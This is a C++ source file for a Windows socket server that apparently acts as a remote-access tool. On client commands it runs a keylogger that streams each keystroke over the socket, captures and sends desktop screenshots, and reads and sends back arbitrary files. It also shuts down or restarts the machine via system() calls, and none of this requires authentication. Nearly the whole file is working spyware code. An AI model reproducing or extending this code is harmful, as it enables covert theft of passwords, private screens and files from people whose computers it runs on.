#include "server_socket.h"

Server::Server(int port)
    : port(port), listenSocket(INVALID_SOCKET) {
    // Initialize Winsock
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
    }

    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
}

Server::~Server() {
    // Clean up GDI+
    GdiplusShutdown(gdiplusToken);
    
    if (listenSocket != INVALID_SOCKET) {
        closesocket(listenSocket);
    }
    WSACleanup();
}

bool Server::start() {
    // Create socket
    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
    }

    // Setup sockaddr_in structure
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(port);

    // Bind socket
    int result = bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        std::cerr << "Bind failed: " << WSAGetLastError() << std::endl;
        closesocket(listenSocket);
        return false;
    }

    // Listen for incoming connections
    result = listen(listenSocket, SOMAXCONN);
    if (result == SOCKET_ERROR) {
        std::cerr << "Listen failed: " << WSAGetLastError() << std::endl;
        closesocket(listenSocket);
        return false;
    }

    std::cout << "Server listening on port " << port << std::endl;
    return true;
}

void Server::listenForConnections() {
    while (true) {
        sockaddr_in clientAddr;
        int clientAddrSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrSize);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed: " << WSAGetLastError() << std::endl;
            continue;
        }

        // Handle the connected client synchronously
        handleClient(clientSocket);

        closesocket(clientSocket);
    }
}

// // Function to take a screenshot and save it as a PNG file
// void Server::takeScreenshot(const std::string& filename) {
//     // Initialize GDI+
//     GdiplusStartupInput gdiplusStartupInput;
//     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

//     // Get the screen dimensions
//     HDC screenDC = GetDC(NULL);
//     HDC memoryDC = CreateCompatibleDC(screenDC);
//     int width = GetSystemMetrics(SM_CXSCREEN);
//     int height = GetSystemMetrics(SM_CYSCREEN);

//     // Create a compatible bitmap
//     HBITMAP hBitmap = CreateCompatibleBitmap(screenDC, width, height);
//     SelectObject(memoryDC, hBitmap);

//     // BitBlt to copy the screen to the bitmap
//     BitBlt(memoryDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);

//     // Create GDI+ Image from the bitmap
//     Bitmap bitmap(hBitmap, NULL);
//     CLSID clsid;
//     HRESULT result = CLSIDFromString(L"{557CC3D0-1A3A-11D1-AD6E-00A0C9138F8C}", &clsid); // CLSID for PNG
//     if (FAILED(result)) {
//         std::cerr << "Failed to get CLSID for PNG." << std::endl;
//         return; // Handle error appropriately
//     }

//     // Save the image as a PNG file
//     WCHAR wFilename[MAX_PATH];
//     MultiByteToWideChar(CP_UTF8, 0, filename.c_str(), -1, wFilename, MAX_PATH);
//     bitmap.Save(wFilename, &clsid, NULL);

//     // Clean up
//     DeleteObject(hBitmap);
//     DeleteDC(memoryDC);
//     ReleaseDC(NULL, screenDC);
//     GdiplusShutdown(gdiplusToken);
// }

std::vector<unsigned char> Server::captureScreenshot() {
    std::vector<unsigned char> imageData;

    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    // Capture screen to bitmap
    HDC hScreenDC = GetWindowDC(GetDesktopWindow());  // Use GetWindowDC to capture the entire screen
    // HDC hScreenDC = GetDC(nullptr);
    int width = GetDeviceCaps(hScreenDC, HORZRES);    // Get the full width of the screen
    int height = GetDeviceCaps(hScreenDC, VERTRES);   // Get the full height of the screen

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    
    // Select the bitmap into the memory device context
    HGDIOBJ oldBitmap = SelectObject(hMemoryDC, hBitmap);
    
    // BitBlt from the screen device context to the memory device context
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    
    // Restore the original bitmap and clean up GDI objects
    SelectObject(hMemoryDC, oldBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(GetDesktopWindow(), hScreenDC);
    
    // Save bitmap to "screenshot.jpg"
    CLSID clsid;
    GetEncoderClsid(L"image/jpeg", &clsid);
    Bitmap bitmap(hBitmap, nullptr);
    bitmap.Save(L"screenshot.jpg", &clsid, nullptr);
    
    // Clean up GDI objects
    DeleteObject(hBitmap);
    GdiplusShutdown(gdiplusToken);
    
    // Read the saved image into imageData
    std::ifstream file("screenshot.jpg", std::ios::binary);
    if (file.is_open()) {
        imageData.assign((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
    }

    return imageData;
}

// Helper function to get CLSID of JPEG encoder
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;          // number of image encoders
    UINT size = 0;        // size of the image encoder array in bytes
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1; // Failure

    std::vector<BYTE> buffer(size);
    Gdiplus::ImageCodecInfo* pImageCodecInfo = reinterpret_cast<Gdiplus::ImageCodecInfo*>(buffer.data());
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[i].Clsid;
            return i;
        }
    }
    return -1; // Failure
}

// Function to send a screenshot image to the client
void Server::sendScreenshot(SOCKET clientSocket, const std::string &filePath) {
    std::vector<unsigned char> imageData = captureScreenshot();
    uint32_t dataSize = htonl(imageData.size());

    // Send size first
    send(clientSocket, reinterpret_cast<const char*>(&dataSize), sizeof(dataSize), 0);

    // Send image data
    send(clientSocket, reinterpret_cast<const char*>(imageData.data()), imageData.size(), 0);
}


void Server::handleClient(SOCKET clientSocket) {
    char recvbuf[512];
    int recvbuflen = 512;

    // Receive data from the client
    int result = recv(clientSocket, recvbuf, recvbuflen, 0);
    if (result > 0) {
        std::string receivedMessage(recvbuf, result);
        std::cout << "Received message: " << receivedMessage << std::endl;

        if (receivedMessage == "shutdown") {
            std::cout << "Shutdown command received. Server is shutting down..." << std::endl;
            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
            shutdownServer();
            exit(0);  // Exit the server program
        }
        if(receivedMessage == "restart"){
            std::cout << "Restart command received. Server is restarting..." << std::endl;
            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
            restartServer();
            exit(0);  // Exit the server program
        }
        if(receivedMessage == "keylogger"){
            std::cout << "Keylogger command received." << std::endl;
            keyLogger(clientSocket);
            closesocket(listenSocket); 
            exit(0);  // Exit the server program
        }
        else if (receivedMessage == "screenshot")
        {
            std::cout << "Screenshot command received. Taking a screenshot..." << std::endl;
            // Take a screenshot and save it
            // takeScreenshot("screenshot.png"); // Save as screenshot.png
            std::cout << "Screenshot taken and saved as screenshot.png" << std::endl;

            // Send the screenshot back to the client
            // sendScreenshot(clientSocket, "screenshot.png");
            sendScreenshot(clientSocket, "screenshot.png");

            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
            exit(0);  // Exit the server program
        }
        else if (receivedMessage.substr(0, 9) == "copy_file")
        {
            std::istringstream iss(receivedMessage);
            std::string command, sourceFileName, destinationFileName;

            // Parse the command
            std::getline(iss, command, '|');
            std::getline(iss, sourceFileName, '|');
            std::getline(iss, destinationFileName);

            // Call the method to copy the file and send it back
            copyFileAndSend(clientSocket, sourceFileName, destinationFileName);

            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
            exit(0);  // Exit the server program
        }
    } else if (result == 0) {
        std::cout << "Connection closing..." << std::endl;
    } else {
        std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
    }
}

// Implementation of copyFileAndSend
void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName) {
    std::ifstream sourceFile(sourceFileName, std::ios::binary);
    if (!sourceFile) {
        std::string errorMessage = "Failed to open source file: " + sourceFileName;
        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
        return;
    }

    // Create the destination file for writing
    std::ofstream destinationFile(destinationFileName, std::ios::binary);
    if (!destinationFile) {
        std::string errorMessage = "Failed to create destination file: " + destinationFileName;
        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
        return;
    }

    // Copy the file content
    destinationFile << sourceFile.rdbuf();

    // Close both files
    sourceFile.close();
    destinationFile.close();

    // Send the copied file back to the client
    std::ifstream copiedFile(destinationFileName, std::ios::binary);
    if (copiedFile) {
        // Get the size of the file
        copiedFile.seekg(0, std::ios::end);
        std::streamsize size = copiedFile.tellg();
        copiedFile.seekg(0, std::ios::beg);

        // Send the size first
        uint32_t fileSize = htonl(size);
        send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);

        // Send the file data
        char buffer[4096];
        while (copiedFile.read(buffer, sizeof(buffer))) {
            send(clientSocket, buffer, copiedFile.gcount(), 0);
        }
        // Send any remaining bytes
        if (copiedFile.gcount() > 0) {
            send(clientSocket, buffer, copiedFile.gcount(), 0);
        }

        std::cout << "File copied and sent back to client successfully." << std::endl;
    } else {
        std::cerr << "Failed to read the copied file." << std::endl;
    }
}


//====================================================================================
void Server::shutdownServer() {


    // Execute Windows shutdown command
    int result = system("shutdown /s /t 0");

    if (result != 0) 
        std::cerr << "Failed to execute shutdown command. Error code: " << result << std::endl;
    

    // Optionally, clean up Winsock resources before shutdown
    WSACleanup();
}


void Server::restartServer(){
    // Execute Windows shutdown command
    int result = system("shutdown /r /t 0");

    if (result != 0) 
        std::cerr << "Failed to execute shutdown command. Error code: " << result << std::endl;
    

    // Optionally, clean up Winsock resources before shutdown
    WSACleanup();
}


// Check if a key is currently pressed
bool isKeyPressed(int vkCode) {
    return GetAsyncKeyState(vkCode) & 0x8000;
}

// Map numbers to their shift-modified symbols
char getShiftedSymbol(int vkCode, bool shiftPressed) {
    switch (vkCode) {
        case '1': return shiftPressed ? '!' : '1';
        case '2': return shiftPressed ? '@' : '2';
        case '3': return shiftPressed ? '#' : '3';
        case '4': return shiftPressed ? '$' : '4';
        case '5': return shiftPressed ? '%' : '5';
        case '6': return shiftPressed ? '^' : '6';
        case '7': return shiftPressed ? '&' : '7';
        case '8': return shiftPressed ? '*' : '8';
        case '9': return shiftPressed ? '(' : '9';
        case '0': return shiftPressed ? ')' : '0';

        // OEM keys and punctuation
        case VK_OEM_1: return shiftPressed ? ':' : ';';  // VK_OEM_1
        case VK_OEM_7: return shiftPressed ? '"' : '\''; // VK_OEM_7
        case VK_OEM_3: return shiftPressed ? '~': '`';
        case VK_OEM_2: return shiftPressed ? '?' : '/';  // VK_OEM_2
        case VK_OEM_4: return shiftPressed ? '{' : '[';  // VK_OEM_4
        case VK_OEM_6: return shiftPressed ? '}' : ']';  // VK_OEM_6
        case VK_OEM_5: return shiftPressed ? '|' : '\\'; // VK_OEM_5
        case VK_OEM_PERIOD: return shiftPressed ? '>' : '.';  // VK_OEM_PERIOD
        case VK_OEM_COMMA: return shiftPressed ? '<' : ',';  // VK_OEM_COMMA
        case VK_OEM_MINUS: return shiftPressed ? '_' : '-';
        case VK_OEM_PLUS: return shiftPressed ? '+' : '='; 

        default: return static_cast<char>(vkCode);  // Return the key as-is if no mapping
    }
}

void Server::readKey(int _key, SOCKET clientSocket) {
    if(_key == 160)
        return;
    char output[1024];
    output[0] = '\0';
    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool shiftPressed = isKeyPressed(VK_SHIFT);
    
    if (_key >= 'A' && _key <= 'Z') {
        bool uppercase = capsLock ^ shiftPressed;  // XOR logic: only one is true
        output[0] = uppercase ? static_cast<char>(_key) : static_cast<char>(_key + 32);
        output[1] = '\0';
    } else if ((_key >= '0' && _key <= '9') || (_key >= 186 && _key <= 222)) {
        // Use the new getShiftedSymbol function for numbers and symbols
        output[0] = getShiftedSymbol(_key, shiftPressed);
        output[1] = '\0';
    }else if (_key >= 112 && _key <= 123) {  // Function keys F1-F12
        sprintf(output, "[F%d]", _key - 111);  // Map 112-123 to F1-F12
    } else {
        // Handle other keys (e.g., space, enter, arrows)
        switch (_key) {
            case VK_SPACE: strcpy(output, "[SPACE]"); break;
            case VK_RETURN: strcpy(output, "[ENTER]"); break;
            case VK_TAB: strcpy(output, "[TAB]"); break;
            case VK_BACK: strcpy(output, "[BACKSPACE]"); break;
            case VK_ESCAPE: strcpy(output, "[ESCAPE]"); break;
            case VK_CONTROL: strcpy(output, "[CTRL]"); break;
            case VK_MENU: strcpy(output, "[ALT]"); break;
            case VK_CAPITAL: strcpy(output, "[CAPS LOCK]"); break;
            case VK_SHIFT: strcpy(output, "[SHIFT]"); break;
            case VK_LEFT: strcpy(output, "[LEFT ARROW]"); break;
            case VK_RIGHT: strcpy(output, "[RIGHT ARROW]"); break;
            case VK_UP: strcpy(output, "[UP ARROW]"); break;
            case VK_DOWN: strcpy(output, "[DOWN ARROW]"); break;
            default:
                if (_key >= 33 && _key <= 126) {
                    output[0] = static_cast<char>(_key);
                    output[1] = '\0';
                }
                break;
        }
    }
    send(clientSocket, output, strlen(output), 0);
   
}


void Server::keyLogger(SOCKET clientSocket) {
    std::cout << "Press CTRL + ESC to exit the program.\n";
    while (true) {
        Sleep(10);  // Reduce CPU usage
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {  // Key press detected
                if (i == VK_ESCAPE) {
                    std::cout << "Exiting...\n";
                    return;  // Exit the function, which stops the program
                }       
                readKey(i, clientSocket);  // Process and print the key
            }
        }
    }
}